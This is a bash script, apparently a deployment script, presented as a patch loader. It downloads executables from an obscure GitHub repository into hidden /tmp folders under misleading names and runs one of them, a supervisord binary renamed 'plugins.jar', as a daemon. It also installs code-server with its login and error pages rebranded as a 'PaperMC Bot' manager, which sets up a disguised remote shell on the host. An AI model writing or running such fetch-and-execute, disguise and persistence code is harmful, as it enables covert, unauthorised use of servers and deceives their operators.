#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/lyla/cdr.conf -o cfg.conf

    # CHECK CDR EXISTENCE
    if [ -f "/tmp/.npm" ]; then
        echo "files're ready ..."
    else
        cd /tmp/ && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/ouch -o ouch && chmod a+x ouch
        curl -LO https://github.com/coder/code-server/releases/download/v4.92.2/code-server-4.92.2-linux-amd64.tar.gz 
        /tmp/ouch decompress code-server-4.92.2-linux-amd64.tar.gz && rm -rf code-server-4.92.2-linux-amd64.tar.gz
        mv code-server-4.92.2-linux-amd64 .npm && cd .npm/ && rm -rf LICENSE ThirdPartyNotices.txt README.md 
        sed -i '2,10d;93,101d' package.json
        sed -i "s/{{I18N_LOGIN_TITLE}}/PaperMC Bot/g" src/browser/pages/login.html
        sed -i "s/{{WELCOME_TEXT}}/BOT MANAGEMENT/g"  src/browser/pages/login.html
        sed -i "s/{{ERROR_TITLE}} - code-server/PaperMC Bot/g" src/browser/pages/error.html
        echo "DONE ..."                          
    fi
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.npm" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/cfg.conf" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
